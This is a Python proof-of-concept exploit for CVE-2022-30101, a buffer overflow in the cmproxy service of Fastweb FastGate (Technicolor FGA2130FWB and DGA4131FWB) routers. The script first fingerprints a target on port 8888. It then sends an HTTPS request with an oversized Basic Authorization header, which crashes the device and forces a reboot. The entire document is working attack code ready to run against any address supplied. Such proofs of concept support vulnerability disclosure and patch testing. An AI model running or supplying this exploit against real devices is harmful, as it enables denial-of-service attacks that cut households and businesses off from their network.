#!/usr/bin/env python3

# PoC for CVE-2022-30101 - Fastweb FastGate cmproxy buffer overflow
# 
# Devices affected:
#  - Technicolor MediaAccess FGA2130FWB - Version 18.3.n.0482_FW_233_FGA2130 and below 
#  - Technicolor MediaAccess DGA4131FWB - Version 18.3.n.0482_FW_264_DGA4131 and below

import sys
import requests
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
requests.packages.urllib3.util.ssl_.DEFAULT_CIPHERS += ':HIGH:!DH:!aNULL'

def check(target):
    url = 'https://{}:8888/check?cmd=xxx'.format(target)
    r = requests.get(url, verify=False)
    return (r.status_code == 401 and r.headers['Server'] == 'lighttpd/1.4.45')

def exploit(target):
    url = 'https://{}:8888/check?cmd=xxx'.format(target)
    authorization = 'Basic ' + 'A' * 3780

    r = requests.get(url, headers = {'Authorization': authorization}, verify=False)

if __name__ == '__main__':

    if len(sys.argv) < 2:
        print('Not enough arguments\nUsage: %s <target>' %(sys.argv[0]))
        sys.exit()

    target = sys.argv[1]

    try:
        if(check(target)):
            print('[+] \'%s\' is likely vulnerable!' % target)
        else:
            print('[-] \'%s\' is not vulnerable!' % target)
            sys.exit()

        print('[*] Exploiting \'%s\'' % target)
        exploit(target)
    except Exception as e:
        print(e)
        sys.exit()

    print('[*] Exploit sent. \'%s\' should reboot' % target)

